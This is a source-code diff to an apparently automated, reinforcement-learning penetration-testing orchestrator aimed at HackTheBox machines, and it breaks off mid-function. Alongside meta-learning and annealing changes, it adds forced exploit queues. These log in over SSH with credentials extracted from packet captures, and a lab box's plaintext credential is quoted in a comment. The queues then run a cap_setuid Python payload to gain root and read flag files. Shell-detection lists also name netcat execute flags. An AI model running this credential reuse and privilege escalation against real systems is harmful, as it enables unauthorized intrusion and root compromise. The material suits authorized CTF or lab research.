@@ -534,6 +534,11 @@ class SmartOrchestrator:
         # ─── HTB D1: FollowupQueue — priority-based command injection ──
         self.followup_queue: List[Dict[str, Any]] = []
 
+        # ─── Fix #13+14: PCAP SSH + Privesc exploit queues ──
+        self._pcap_ssh_queue: list[tuple[str, str]] = []
+        self._pcap_ssh_used: bool = False
+        self._priv_exploit_queue: list[dict] = []
+
         # ─── P34-EXT: LearningMetrics — per-step/episode learning quality ──
         self.learning_metrics = None
         try:
@@ -720,26 +725,30 @@ class SmartOrchestrator:
         except Exception as e:
             _init_modules.append(("RND Curiosity", "warn", str(e)[:40]))
         
-        # ─── C08: Reptile Meta-Learning ──────────────────────────────
-        # First-order meta-learning over scenario distributions.
-        # Runs between episodes on per-coach PPO networks.
-        # Gated by FF_REPTILE_META (default=False until validated).
+        # ─── C08: Reptile Meta-Learning ────────────────────────────
+        # Phase 50: Re-wired with proper per-scenario inner loop,
+        # optimizer state snapshot/restore, and episode cooldown.
+        # Gated by FF_REPTILE_META (default=True, Phase 50).
         self.reptile = None
         self._reptile_global_step: int = 0
+        self._reptile_episode_cooldown: int = 3  # meta-step every N episodes
+        self._reptile_episodes_since_last: int = 0
         try:
-            from core.feature_flags import get_feature_flags as _get_ff
-            if _get_ff().reptile_meta:
+            from core.feature_flags import get_feature_flags as _get_ff_rep
+            if _get_ff_rep().reptile_meta:
                 from core.algorithms.reptile_meta import ReptileMeta, ReptileConfig
-                self.reptile = ReptileMeta(config=ReptileConfig(
+                self.reptile = ReptileMeta(ReptileConfig(
                     enabled=True,
                     outer_lr=0.1,
-                    inner_steps=5,
+                    inner_steps=20,       # Must >= PPO minibatch_size (16)
                     scenarios_per_step=3,
-                    warmup_steps=100,
+                    warmup_steps=50,
+                    anneal_outer_lr=0.01,
+                    cosine_anneal_steps=3000,
                 ))
-                _init_modules.append(("Reptile Meta", "ok", "scenarios=27, inner=5"))
+                _init_modules.append(("Reptile Meta", "ok", "P50: scenarios=3, inner=20"))
             else:
-                _init_modules.append(("Reptile Meta", "skip", "FF_REPTILE_META=false"))
+                _init_modules.append(("Reptile Meta", "skip", "FF_REPTILE_META=0"))
         except Exception as e:
             _init_modules.append(("Reptile Meta", "warn", str(e)[:40]))
         
@@ -771,6 +780,18 @@ class SmartOrchestrator:
             _init_modules.append(("ScheduleCoupler", "ok", "strength=0.8"))
         except Exception as e:
             _init_modules.append(("ScheduleCoupler", "warn", str(e)[:40]))
+
+        # ─── STRUCTURAL CONSOLIDATION: MaturityController ────────────
+        # Single authority for entropy, mentor rate, and all annealing.
+        # Replaces fragmented ScheduleCoupler + PPO internal entropy +
+        # SmartCoach direct entropy mutation.
+        self._maturity_controller = None
+        try:
+            from core.decision.maturity_controller import GlobalMaturityController
+            self._maturity_controller = GlobalMaturityController()
+            _init_modules.append(("MaturityController", "ok", "M=0.0"))
+        except Exception as e:
+            _init_modules.append(("MaturityController", "warn", str(e)[:40]))
         
         # ─── R66: Coherence Tracker ──────────────────────────────────
         self.coherence_tracker = None
@@ -1554,19 +1575,59 @@ class SmartOrchestrator:
             if _mp is not None and hasattr(_mp, 'set_maturity'):
                 _mp.set_maturity(_maturity)
         
-        # C11: Coupled schedule annealing — coordinates mentor, LLM bridge, PPO
-        if self.schedule_coupler is not None:
-            for _cname, _coach in self.coaches.items():
-                try:
-                    self.schedule_coupler.update(
-                        maturity=_maturity,
-                        episode=episode_number,
-                        mentor_policy=getattr(_coach, 'mentor_policy', None),
-                        llm_bridge=getattr(_coach, 'llm_bridge', None),
-                        ppo_agent=getattr(_coach, 'ppo_agent', None),
-                    )
-                except Exception as e:
-                    logger.debug(f"C11: ScheduleCoupler error for {_cname}: {e}")
+        # C11: ScheduleCoupler REMOVED (P3: Single Schedule Authority)
+        # ScheduleCoupler wrote 5 targets that MaturityController immediately
+        # overwrote. Removed to eliminate dead writes and duplicate annealing.
+
+        # ─── STRUCTURAL CONSOLIDATION: MaturityController ────────────
+        # Single annealing authority — coordinates entropy, mentor, BC/KL
+        # across all coaches. Replaces fragmented schedule coupling.
+        if self._maturity_controller is not None:
+            try:
+                _mc_metrics = {
+                    "success_rate": _success_rate if '_success_rate' in dir() else 0.0,
+                    "skill_coverage": (
+                        _skill_count / max(_max_skills, 1)
+                        if '_skill_count' in dir() and '_max_skills' in dir()
+                        else 0.0
+                    ),
+                    "discovery_efficiency": (
+                        _discovery_eff if '_discovery_eff' in dir() else 0.0
+                    ),
+                    "stagnation_rate": (
+                        _stagnation if '_stagnation' in dir() else 0.0
+                    ),
+                }
+                _mc_state = self._maturity_controller.update(
+                    episode_number, _mc_metrics
+                )
+                # Inject controller into coaches and apply to learners
+                for _cname, _coach in self.coaches.items():
+                    _coach._maturity_controller = self._maturity_controller
+                    try:
+                        self._maturity_controller.apply_all(
+                            ppo_agent=getattr(_coach, 'ppo_agent', None),
+                            sac_agent=getattr(_coach, 'sac_agent', None),
+                            llm_bridge=getattr(
+                                _coach, '_p37_llm_bridge', None
+                            ),
+                            mentor_policy=getattr(
+                                _coach, 'mentor_policy', None
+                            ),
+                        )
+                    except Exception as _apply_err:
+                        logger.debug(
+                            f"MaturityController apply error for "
+                            f"{_cname}: {_apply_err}"
+                        )
+                logger.debug(
+                    f"[MATURITY] ep={episode_number} "
+                    f"M={_mc_state.maturity:.3f} "
+                    f"entropy={_mc_state.entropy_coef:.4f} "
+                    f"mentor={_mc_state.mentor_rate:.3f}"
+                )
+            except Exception as e:
+                logger.debug(f"MaturityController update error: {e}")
         
         # PHASE 2A: Reset per-agent GPT call counters
         for agent in self.agents.values():
@@ -1748,6 +1809,10 @@ class SmartOrchestrator:
             self.cred_reuse_engine.reset()
         if hasattr(self, 'followup_queue'):
             self.followup_queue = []
+        # Fix #13+14: Reset forced queues for new episode
+        self._pcap_ssh_queue = []
+        self._pcap_ssh_used = False
+        self._priv_exploit_queue = []
         
         # Reset environment
         state = self.env.reset()
@@ -3116,48 +3181,72 @@ class SmartOrchestrator:
             except Exception as _e:
                 logger.debug(f"[P39.4] DebugTracer episode end error: {_e}")
         
-        # ─── C08: Reptile Meta-Learning — between episodes ──────────
-        # Run on each coach's PPO network to interpolate weights toward
-        # a scenario-diverse optimum.
+        # ─── P6: Runtime IntegrityCheck at episode end ───────────────
+        if self._integrity_check is not None:
+            _first_coach = next(iter(self.coaches.values()), None)
+            if _first_coach is not None:
+                _hm = getattr(_first_coach, '_harmony_metrics', None)
+                _total_steps = len(step_results)
+                _rt_report = self._integrity_check.check_runtime(
+                    _first_coach, _hm, _total_steps
+                )
+                if not _rt_report.passed:
+                    for _rv in _rt_report.violations:
+                        logger.warning(
+                            f"[INTEGRITY-RT] {_rv.check_name}: "
+                            f"{_rv.message}"
+                        )
+
+        # ─── P7: Harmony Metrics snapshot + export at episode end ────
+        _first_coach_p7 = next(iter(self.coaches.values()), None)
+        if _first_coach_p7 is not None:
+            _hm_p7 = getattr(_first_coach_p7, '_harmony_metrics', None)
+            if _hm_p7 is not None:
+                # Finalize episode KL
+                _hm_p7.end_episode_kl()
+                # Take snapshot
+                _snap = _hm_p7.snapshot(
+                    episode=episode_number,
+                    step=len(step_results),
+                )
+                metrics["harmony"] = _snap.to_dict()
+                logger.info(
+                    f"[HARMONY] ep={episode_number} "
+                    f"src_entropy={_snap.decision_source_entropy:.3f} "
+                    f"mentor_dep={_snap.mentor_dependence:.3f} "
+                    f"reward_var={_snap.reward_variance:.2f} "
+                    f"kl={_snap.kl_drift:.5f} "
+                    f"entropy_writers={_snap.entropy_writer_count} "
+                    f"macro_switch={_snap.macro_switch_rate:.3f}"
+                )
+                # Reset per-episode accumulators
+                _hm_p7.reset_episode()
+
+        # ─── C08: Reptile Meta-Learning (Phase 50) ──────────────────
+        # Proper per-scenario inner loop with optimizer state handling.
         if self.reptile is not None:
-            self._reptile_global_step += len(step_results)
-            if self.reptile.should_run(self._reptile_global_step):
+            self._reptile_episodes_since_last += 1
+            _should_reptile = (
+                self._reptile_episodes_since_last >= self._reptile_episode_cooldown
+                and self.reptile.should_run(self._reptile_global_step)
+            )
+            # Maturity gating: only run when maturity < ceiling
+            if _should_reptile and self._maturity_controller is not None:
+                _should_reptile = self._maturity_controller.should_run_reptile()
+            if _should_reptile:
                 try:
-                    for _coach_name, _coach in self.coaches.items():
-                        _coach_ppo = getattr(_coach, 'ppo_agent', None)
-                        if _coach_ppo is None:
-                            continue
-                        _network = getattr(_coach_ppo, 'network', None)
-                        if _network is None:
-                            continue
-
-                        def _inner_train(model, scenario_name, inner_steps, _ppo=_coach_ppo):
-                            """Dummy inner loop — no real env interaction, just
-                            a PPO update on the current buffer if available."""
-                            _upd = {}
-                            if hasattr(_ppo, 'buffer') and len(getattr(_ppo.buffer, 'states', [])) > 0:
-                                try:
-                                    _upd = _ppo.update(last_value=0.0) or {}
-                                except Exception:
-                                    _upd = {}
-                            return {"loss": _upd.get("total_loss", 0.0),
-                                    "reward": _upd.get("value_loss", 0.0),
-                                    "scenario": scenario_name}
-
-                        _maturity_signal = metrics.get("success_rate", 0.0)
-                        _rep_stats = self.reptile.meta_step(
-                            model=_network,
-                            inner_train_fn=_inner_train,
-                            global_step=self._reptile_global_step,
-                            maturity=_maturity_signal,
-                        )
-                        metrics.setdefault("reptile", {})[_coach_name] = _rep_stats
-                        logger.debug(
-                            f"[REPTILE] {_coach_name}: meta_step={_rep_stats['meta_step']} "
-                            f"lr={_rep_stats['outer_lr']:.4f}"
-                        )
-                except Exception as _re:
-                    logger.debug(f"[C08] Reptile meta-step error: {_re}")
+                    _rep_stats = self._run_reptile_meta_step(episode_number)
+                    self._reptile_episodes_since_last = 0
+                    metrics["reptile_meta_step"] = _rep_stats.get("meta_step", 0)
+                    metrics["reptile_outer_lr"] = _rep_stats.get("outer_lr", 0.0)
+                    metrics["reptile_scenarios"] = _rep_stats.get("scenarios", [])
+                    logger.info(
+                        f"[REPTILE] meta-step {_rep_stats.get('meta_step', '?')}: "
+                        f"lr={_rep_stats.get('outer_lr', 0):.4f}, "
+                        f"scenarios={_rep_stats.get('scenarios', [])}"
+                    )
+                except Exception as e:
+                    logger.warning(f"[REPTILE] meta-step failed: {e}")
         
         # ─── C09: Held-Out Evaluation ────────────────────────────────
         if self.heldout_evaluator is not None and self.heldout_evaluator.should_eval(episode_number):
@@ -4332,8 +4421,63 @@ class SmartOrchestrator:
             # PHASE 0.1: STUCK-ESCAPE LOGIC
             # =========================================================================
             decision = None
-            
-            if is_repeat_stuck:
+
+            # ─── Fix #14: FORCED PRIVESC EXPLOIT QUEUE ───────────────
+            # Highest priority: if cap_setuid (or similar privesc) exploit
+            # was detected, force it IMMEDIATELY on RedAgent.
+            if (
+                agent_name == "RedAgent"
+                and hasattr(self, '_priv_exploit_queue')
+                and self._priv_exploit_queue
+            ):
+                _pe = self._priv_exploit_queue.pop(0)
+                decision = SmartDecisionResult(
+                    command=_pe["command"],
+                    source=_pe.get("source", "cap_setuid_exploit"),
+                    confidence=0.99,
+                    template_name="privesc_exploit",
+                    params={},
+                    reasoning=_pe.get("description", "Privilege escalation exploit"),
+                    phase=ctx.current_phase if ctx else AttackPhase.PRIVILEGE_ESCALATION,
+                    mentor_call=False,
+                )
+                logger.warning(
+                    f"[PRIV-EXPLOIT] FORCED exploit: {_pe['command'][:80]} "
+                    f"(step={step}, remaining={len(self._priv_exploit_queue)})"
+                )
+
+            # ─── P51: FORCED PCAP SSH LOGIN ──────────────────────────
+            # Highest priority: if PCAP extractor found credentials, force SSH
+            # login IMMEDIATELY on RedAgent before any other decision pipeline.
+            if (
+                agent_name == "RedAgent"
+                and hasattr(self, '_pcap_ssh_queue')
+                and self._pcap_ssh_queue
+            ):
+                _ssh_user, _ssh_pass = self._pcap_ssh_queue.pop(0)
+                _ssh_target = self.config.default_target or ""
+                _ssh_cmd = (
+                    f"sshpass -p '{_ssh_pass}' ssh -o StrictHostKeyChecking=no "
+                    f"-o ConnectTimeout=10 {_ssh_user}@{_ssh_target} "
+                    f"'id && whoami && cat /home/{_ssh_user}/user.txt "
+                    f"&& sudo -l 2>&1 | head -20'"
+                )
+                decision = SmartDecisionResult(
+                    command=_ssh_cmd,
+                    source="pcap_ssh",
+                    confidence=0.99,
+                    template_name="ssh_login",
+                    params={"username": _ssh_user, "target": _ssh_target},
+                    reasoning=f"PCAP-extracted credential: {_ssh_user}@{_ssh_target}",
+                    phase=ctx.current_phase if ctx else AttackPhase.EXPLOITATION,
+                    mentor_call=False,
+                )
+                logger.warning(
+                    f"[PCAP-SSH] FORCED SSH login: {_ssh_user}@{_ssh_target} "
+                    f"(step={step}, remaining={len(self._pcap_ssh_queue)})"
+                )
+
+            if is_repeat_stuck and decision is None:
                 # Update repeat stuck counter
                 self.repeat_stuck_count[agent_name] = self.repeat_stuck_count.get(agent_name, 0) + 1
                 
@@ -4390,24 +4534,35 @@ class SmartOrchestrator:
                     if self.followup_queue:
                         # Sort by priority (highest first)
                         self.followup_queue.sort(key=lambda x: x.get("priority", 0), reverse=True)
-                        fq_entry = self.followup_queue.pop(0)
-                        # Decrement TTL of remaining entries
-                        for fq in self.followup_queue:
-                            fq["ttl"] = fq.get("ttl", 1) - 1
-                        decision = SmartDecisionResult(
-                            command=fq_entry["command"],
-                            source=fq_entry.get("source", "followup_queue"),
-                            confidence=0.90,
-                            template_name=f"followup_{fq_entry.get('service', 'generic')}",
-                            params={},
-                            reasoning=fq_entry.get("description", "Followup queue command"),
-                            phase=ctx.current_phase if ctx is not None else AttackPhase.RECON,
-                            mentor_call=False,
-                        )
-                        logger.debug(
-                            f"[FOLLOWUP-Q][{agent_name}] Consumed: {decision.command[:80]} "
-                            f"(source={fq_entry.get('source')}, remaining={len(self.followup_queue)})"
-                        )
+                        # Fix #15: Honor agent_restrict field — only consume
+                        # items targeted at this agent (or unrestricted items).
+                        fq_entry = None
+                        fq_idx = None
+                        for _fqi, _fq in enumerate(self.followup_queue):
+                            _restrict = _fq.get("agent_restrict")
+                            if _restrict is None or _restrict == agent_name:
+                                fq_entry = _fq
+                                fq_idx = _fqi
+                                break
+                        if fq_entry is not None:
+                            self.followup_queue.pop(fq_idx)
+                            # Decrement TTL of remaining entries
+                            for fq in self.followup_queue:
+                                fq["ttl"] = fq.get("ttl", 1) - 1
+                            decision = SmartDecisionResult(
+                                command=fq_entry["command"],
+                                source=fq_entry.get("source", "followup_queue"),
+                                confidence=0.90,
+                                template_name=f"followup_{fq_entry.get('service', 'generic')}",
+                                params={},
+                                reasoning=fq_entry.get("description", "Followup queue command"),
+                                phase=ctx.current_phase if ctx is not None else AttackPhase.RECON,
+                                mentor_call=False,
+                            )
+                            logger.debug(
+                                f"[FOLLOWUP-Q][{agent_name}] Consumed: {decision.command[:80]} "
+                                f"(source={fq_entry.get('source')}, remaining={len(self.followup_queue)})"
+                            )
                 
                 if decision is None:
                     # Normal decision flow (also handles forced-novel cap fallthrough)
@@ -4525,6 +4680,24 @@ class SmartOrchestrator:
                     )
                     result.decision.command = _exec_cmd
 
+                # ── P50: Sanitize bash-only syntax for /bin/sh ──────
+                # PPO and LLM may generate bash-only <<< heredoc syntax
+                # which fails under /bin/sh (dash). Convert to pipe form.
+                if '<<<' in _exec_cmd:
+                    import re as _re_san
+                    # Pattern: cmd <<< $'...' or cmd <<< "..." or cmd <<< '...'
+                    _hd = _re_san.match(
+                        r"^(.+?)\s*<<<\s*\$?['\"](.+?)['\"](.*)$",
+                        _exec_cmd, _re_san.DOTALL,
+                    )
+                    if _hd:
+                        _before, _content, _after = _hd.groups()
+                        _exec_cmd = f"echo -e '{_content}' | {_before}{_after}"
+                        result.decision.command = _exec_cmd
+                        logger.debug(
+                            "Sanitized <<< heredoc → pipe: %s", _exec_cmd[:80]
+                        )
+
                 live_result = self.live_executor.execute(
                     _exec_cmd,
                     result.agent_name,
@@ -4582,6 +4755,31 @@ class SmartOrchestrator:
                                             for c in pcap_creds
                                         )
                                     )
+                                    # ── P51: Queue forced SSH login with PCAP creds ──
+                                    # The PCAP extractor found real credentials (e.g.,
+                                    # nathan:Buck3tH4TF0RM3! from Cap). Queue SSH
+                                    # logins so they execute on the NEXT step as
+                                    # forced commands, bypassing the normal pipeline.
+                                    # Fix #13: Only queue ONCE — prevent repeated
+                                    # PCAP downloads from re-populating the queue
+                                    # and wasting 5+ steps on duplicate SSH logins.
+                                    if not hasattr(self, '_pcap_ssh_queue'):
+                                        self._pcap_ssh_queue: list[tuple[str, str]] = []
+                                    if not getattr(self, '_pcap_ssh_used', False):
+                                        for _pc in pcap_creds:
+                                            if (_pc.username and _pc.password
+                                                    and len(_pc.password) >= 4
+                                                    and '\r' not in _pc.password
+                                                    and '\n' not in _pc.password):
+                                                self._pcap_ssh_queue.append(
+                                                    (_pc.username, _pc.password)
+                                                )
+                                                logger.warning(
+                                                    f"[PCAP-SSH] Queued SSH login: "
+                                                    f"{_pc.username}@{self._target_ip}"
+                                                )
+                                        if self._pcap_ssh_queue:
+                                            self._pcap_ssh_used = True
                             except Exception as _e:
                                 logger.debug(f"[PCAP-EXTRACT] Error on {_dl_path}: {_e}")
         else:
@@ -4664,7 +4862,8 @@ class SmartOrchestrator:
                                   "invalid", "failed", "unsuccessful", "no such", "cannot",
                                   "permission denied", "authentication fail",
                                   "traceback", "modulenotfounderror", "importerror",
-                                  "nameerror", "syntaxerror", "no module named")
+                                  "nameerror", "syntaxerror", "no module named",
+                                  "no results")  # Phase 51: searchsploit "No Results"
             has_failure = any(f in output_lower_check for f in FAILURE_INDICATORS)
             has_output = len(output_to_parse.strip()) > 10  # non-trivial output
             
@@ -4675,17 +4874,22 @@ class SmartOrchestrator:
                 "psql_rce", "ssh_login", "telnet_login",
                 "nc_reverse_shell", "nc_bind_shell",
             }
-            # NOTE: Don't use cmd_text prefix matching — anti-repeat can
-            # replace the actual command while keeping the original template_name,
-            # causing false positives (e.g. nc -zv port scan replacing cme_smb_shares).
-            # Only use template_name matching which is reliable.
+            # Phase 51 Fix: Anti-repeat can replace a shell-granting command
+            # (e.g. ssh_login) with a non-shell command (e.g. searchsploit)
+            # while keeping the ORIGINAL template_name.  This caused false
+            # shell detection when the template_name matched SHELL_GRANTING_COMMANDS
+            # but the actual command text was completely unrelated.
+            # FIX: Verify BOTH template_name AND command text match shell patterns.
+            _SHELL_CMD_PREFIXES = ("sshpass ", "ssh ", "telnet ", "rlogin ",
+                                   "rsh ", "nc -e ", "nc -c ", "ncat -e ",
+                                   "msfconsole ", "python -c ")
+            _cmd_text_is_shell = any(cmd_text.startswith(p) for p in _SHELL_CMD_PREFIXES)
             
-            cmd_is_shell_granting = cmd_name in SHELL_GRANTING_COMMANDS
+            cmd_is_shell_granting = cmd_name in SHELL_GRANTING_COMMANDS and _cmd_text_is_shell
             # Phase 8.2 Batch 13: Also detect shell from command text when anti-repeat
             # replaces a command but keeps the original template_name
             if not cmd_is_shell_granting and cmd_text:
-                _shell_cmd_indicators = ("sshpass ", "ssh ", "telnet ", "rlogin ", "rsh ", "nc -e ")
-                if any(cmd_text.startswith(ind) for ind in _shell_cmd_indicators):
+                if any(cmd_text.startswith(ind) for ind in _SHELL_CMD_PREFIXES):
                     cmd_is_shell_granting = True
             
             # R47 Fix #1: Override has_failure when POSITIVE shell indicators appear
@@ -4711,11 +4915,12 @@ class SmartOrchestrator:
                     agent_discoveries["shell"] = True
                     logger.info(f"[SHELL-DETECT] Command-based shell detection for '{cmd_name}' by {result.agent_name}")
                 # Root shell for known root-granting commands
+                # Fix #10: ssh_login/telnet_login removed — SSH/telnet logins
+                # are NOT guaranteed root (e.g. nathan on Cap). Root detection
+                # relies on the output-based uid=0(root) check below.
                 ROOT_SHELL_COMMANDS = {
                     "telnet_1524", "rsh_root", "rlogin_root", "vsftpd_exploit",
                     "unrealircd_exploit", "samba_exploit",
-                    # Phase 8.2 Batch 13: SSH with default creds on MS2/MS3 → sudo root
-                    "ssh_login", "telnet_login",
                 }
                 if cmd_name in ROOT_SHELL_COMMANDS or "1524" in cmd_text:
                     if not agent_discoveries.get("root_shell"):
@@ -5174,31 +5379,71 @@ class SmartOrchestrator:
                             self.discovery_board["exploited_services"].add(_svc)
                     
                     # HTB: Auto-queue critical privesc enumeration commands
-                    # when a shell is obtained. These run on the target via SSH auto-wrap.
-                    if not self.discovery_board.get("_privesc_enum_queued"):
+                    # when a shell is obtained.
+                    # Fix #12: SSH-wrap ALL privesc commands so they run ON THE TARGET.
+                    # Fix #14: getcap + sudo -l go to _priv_exploit_queue (forced,
+                    # RedAgent only). Remaining go to followup_queue restricted to Red.
+                    _has_ssh_creds = bool(self.discovery_board.get("credentials"))
+                    if not self.discovery_board.get("_privesc_enum_queued") and _has_ssh_creds:
                         self.discovery_board["_privesc_enum_queued"] = True
-                        _privesc_cmds = [
-                            {"command": "getcap -r / 2>/dev/null",
-                             "description": "Find binaries with Linux capabilities (cap_setuid, etc.)"},
-                            {"command": "sudo -l 2>/dev/null",
-                             "description": "Check sudo permissions for current user"},
-                            {"command": "find / -perm -4000 -type f 2>/dev/null | head -30",
-                             "description": "Find SUID binaries for privilege escalation"},
-                            {"command": "cat /home/*/user.txt 2>/dev/null || cat /root/root.txt 2>/dev/null",
-                             "description": "Read CTF flags if accessible"},
+                        # Get SSH creds for wrapping
+                        _cred_list = self.discovery_board.get("credentials_list", [])
+                        _ssh_u = _ssh_p = ""
+                        if _cred_list:
+                            _ssh_u = _cred_list[0].get("username", "")
+                            _ssh_p = _cred_list[0].get("password", "")
+                        _ssh_t = self.config.default_target or ""
+                        # CRITICAL privesc commands → _priv_exploit_queue (forced)
+                        _forced_privesc = [
+                            "getcap -r / 2>/dev/null",
+                            "sudo -l 2>/dev/null",
                         ]
-                        for pcmd in _privesc_cmds:
+                        # Secondary privesc commands → followup_queue (Red-only)
+                        _secondary_privesc = [
+                            "find / -perm -4000 -type f 2>/dev/null | head -30",
+                            "cat /home/*/user.txt 2>/dev/null; cat /root/root.txt 2>/dev/null",
+                            "uname -a && id",
+                            "ls -la /home/ 2>/dev/null",
+                        ]
+                        if not hasattr(self, '_priv_exploit_queue'):
+                            self._priv_exploit_queue: list[dict] = []
+                        for _raw_cmd in _forced_privesc:
+                            if _ssh_u and _ssh_p and _ssh_t:
+                                _wrapped = (
+                                    f"sshpass -p '{_ssh_p}' ssh -o StrictHostKeyChecking=no "
+                                    f"-o ConnectTimeout=10 {_ssh_u}@{_ssh_t} "
+                                    f"'{_raw_cmd}'"
+                                )
+                            else:
+                                _wrapped = _raw_cmd
+                            self._priv_exploit_queue.append({
+                                "command": _wrapped,
+                                "source": "privesc_enum",
+                                "description": f"FORCED privesc: {_raw_cmd[:40]}",
+                            })
+                        for _raw_cmd in _secondary_privesc:
+                            if _ssh_u and _ssh_p and _ssh_t:
+                                _wrapped = (
+                                    f"sshpass -p '{_ssh_p}' ssh -o StrictHostKeyChecking=no "
+                                    f"-o ConnectTimeout=10 {_ssh_u}@{_ssh_t} "
+                                    f"'{_raw_cmd}'"
+                                )
+                            else:
+                                _wrapped = _raw_cmd
                             self.followup_queue.append({
-                                "command": pcmd["command"],
+                                "command": _wrapped,
                                 "source": "privesc_enum",
                                 "priority": 95,
-                                "description": pcmd["description"],
+                                "description": f"Privesc enum: {_raw_cmd[:40]}",
                                 "service": "ssh",
                                 "ttl": 20,
+                                "agent_restrict": "RedAgent",
                             })
                         logger.warning(
-                            f"[PRIVESC-ENUM] Shell obtained — queued {len(_privesc_cmds)} "
-                            f"privesc enumeration commands"
+                            f"[PRIVESC-ENUM] Shell obtained — queued "
+                            f"{len(_forced_privesc)} FORCED + {len(_secondary_privesc)} "
+                            f"secondary privesc commands "
+                            f"(user={_ssh_u}, target={_ssh_t})"
                         )
                 if agent_discoveries.get("vulnerability"):
                     self.discovery_board["vulns"].add("found")
@@ -6219,6 +6464,17 @@ class SmartOrchestrator:
             users = []
             for pattern in user_patterns:
                 users.extend(re.findall(pattern, output, re.IGNORECASE))
+            # P51: Filter out HTML artifacts and garbage from user list
+            _INVALID_USER_RE = re.compile(r'[<>{}()\[\]&;/\\|]|^\d+$|^[A-Z]{20,}$')
+            users = [
+                u for u in users
+                if len(u) >= 2 and len(u) <= 32
+                and not _INVALID_USER_RE.search(u)
+                and u.lower() not in {"root", "bin", "daemon", "sys", "nobody",
+                                       "www", "http", "https", "ftp", "ssh",
+                                       "null", "true", "false", "none", "admin",
+                                       "test", "guest", "user", "attempts"}
+            ]
             if users:
                 discoveries["user"] = list(set(users))
         
@@ -6299,6 +6555,40 @@ class SmartOrchestrator:
                 _existing = discoveries.get("web_path", [])
                 discoveries["web_path"] = list(set(_existing + [p.strip("/").split("/")[-1] for p in ferox_paths]))[:30]
                 discoveries["directory"] = True
+            # ── P50: Extract web paths from HTML href/src attributes ─────
+            # When we curl a homepage, links like href="/data/0" reveal
+            # important paths. Extract top-level path segments from hrefs.
+            _href_paths = re.findall(
+                r'(?:href|src|action)=["\']/?([a-zA-Z][\w\-]{1,30})(?:/[^"\']*)?["\']',
+                output, re.IGNORECASE,
+            )
+            if _href_paths:
+                _existing_hp = discoveries.get("web_path", [])
+                # Deduplicate case-insensitively, exclude common static paths
+                _static_noise = {
+                    "css", "js", "img", "images", "static", "assets",
+                    "fonts", "favicon", "jquery", "bootstrap", "style",
+                    "script", "vendor", "node_modules", "wp-content",
+                    "wp-includes", "wp-admin",
+                }
+                _new_paths = list(set(
+                    p.lower() for p in _href_paths
+                    if p.lower() not in _static_noise and len(p) > 1
+                ))[:20]
+                if _new_paths:
+                    discoveries["web_path"] = list(set(_existing_hp + _new_paths))[:30]
+                    discoveries["directory"] = True
+            # ── P50: Extract paths from "/$p/ → STATUS" probe output ─────
+            _probe_hits = re.findall(
+                r'/(\w+)/?\s*→\s*(200|301|302)',
+                output,
+            )
+            if _probe_hits:
+                _existing_pr = discoveries.get("web_path", [])
+                _hit_paths = [p.lower() for p, _ in _probe_hits if len(p) > 1]
+                if _hit_paths:
+                    discoveries["web_path"] = list(set(_existing_pr + _hit_paths))[:30]
+                    discoveries["directory"] = True
             # Phase 39: Filter out local filesystem paths from web_path discoveries
             _local_prefixes = (
                 "/usr/", "/etc/", "/var/", "/home/", "/bin/", "/sbin/",
@@ -6456,11 +6746,20 @@ class SmartOrchestrator:
                 flag_match = re.search(pattern, output, re.IGNORECASE)
                 if flag_match:
                     flag_value = flag_match.group(0)
-                    # Determine if user or root flag based on command context
-                    if any(rf in cmd_lower for rf in ["root.txt", "root_flag", "cat /root/", "proof.txt"]):
+                    # Fix #11: Determine user vs root flag with dedup guard.
+                    # Commands like 'cat /home/*/user.txt || cat /root/root.txt'
+                    # contain BOTH patterns — prefer user.txt if present.
+                    _has_user_ctx = any(uf in cmd_lower for uf in ["user.txt", "user_flag"])
+                    _has_root_ctx = any(rf in cmd_lower for rf in ["root.txt", "root_flag", "cat /root/", "proof.txt"])
+                    # Check if this value was already captured as user_flag
+                    _known_user_flag = self.discovery_board.get("user_flag_value", "") if hasattr(self, "discovery_board") else ""
+                    if _has_root_ctx and not _has_user_ctx and flag_value != _known_user_flag:
                         discoveries["root_flag"] = flag_value
                         discoveries["flag"] = flag_value
                     else:
+                        # Default to user_flag if: has user.txt context,
+                        # or command has both contexts, or value matches
+                        # the already-captured user flag.
                         discoveries["user_flag"] = flag_value
                         discoveries["flag"] = flag_value
                     break
@@ -6592,23 +6891,39 @@ class SmartOrchestrator:
                 discoveries["vulnerability"] = True
                 # Auto-queue cap_setuid exploitation if python3 found
                 if "python" in binary_path.lower() and "cap_setuid" in cap_name.lower():
-                    exploit_cmd = (
-                        f"{binary_path} -c "
-                        f"'import os; os.setuid(0); os.system(\"id && cat /root/root.txt 2>/dev/null && cat /home/*/user.txt 2>/dev/null\")'"
-                    )
+                    # Fix #12: SSH-wrap the exploit command so it runs ON THE TARGET.
+                    _cred_list = self.discovery_board.get("credentials_list", [])
+                    _ssh_u = _cred_list[0].get("username", "") if _cred_list else ""
+                    _ssh_p = _cred_list[0].get("password", "") if _cred_list else ""
+                    _ssh_t = self.config.default_target or ""
+                    # Build the exploit: python3.x -c 'import os; os.setuid(0); os.system("cmd")'
+                    _inner = 'import os; os.setuid(0); os.system(\\"id && cat /root/root.txt 2>/dev/null && whoami\\")'
+                    if _ssh_u and _ssh_p and _ssh_t:
+                        exploit_cmd = (
+                            f"sshpass -p '{_ssh_p}' ssh -o StrictHostKeyChecking=no "
+                            f"-o ConnectTimeout=10 {_ssh_u}@{_ssh_t} "
+                            f"'{binary_path} -c \"{_inner}\"'"
+                        )
+                    else:
+                        exploit_cmd = (
+                            f"{binary_path} -c "
+                            f"'import os; os.setuid(0); os.system(\"id && cat /root/root.txt 2>/dev/null && whoami\")'"
+                        )
                     if not self.discovery_board.get("_cap_setuid_exploit_queued"):
                         self.discovery_board["_cap_setuid_exploit_queued"] = True
-                        self.followup_queue.append({
+                        # Fix #14: Use dedicated _priv_exploit_queue for FORCED
+                        # execution (bypasses shared followup_queue so it can't
+                        # be lost to non-Red agents or buried behind web probes).
+                        if not hasattr(self, '_priv_exploit_queue'):
+                            self._priv_exploit_queue: list[dict] = []
+                        self._priv_exploit_queue.append({
                             "command": exploit_cmd,
                             "source": "cap_setuid_exploit",
-                            "priority": 100,
                             "description": f"Exploit {binary_path} cap_setuid for root",
-                            "service": "ssh",
-                            "ttl": 20,
                         })
                         logger.warning(
                             f"[CAP-SETUID] Found {binary_path} with {cap_name} — "
-                            f"queued root exploitation command"
+                            f"queued FORCED root exploitation command"
                         )
         
         # ── Phase 35: Final IP-octet port filter (all sources) ──
@@ -7807,7 +8122,223 @@ class SmartOrchestrator:
         )
         
         self.trace_writer.log_step(trace)
-    
+
+    # ─── Reptile Meta-Learning (Phase 50) ────────────────────────────
+
+    def _run_reptile_meta_step(
+        self, episode_number: int
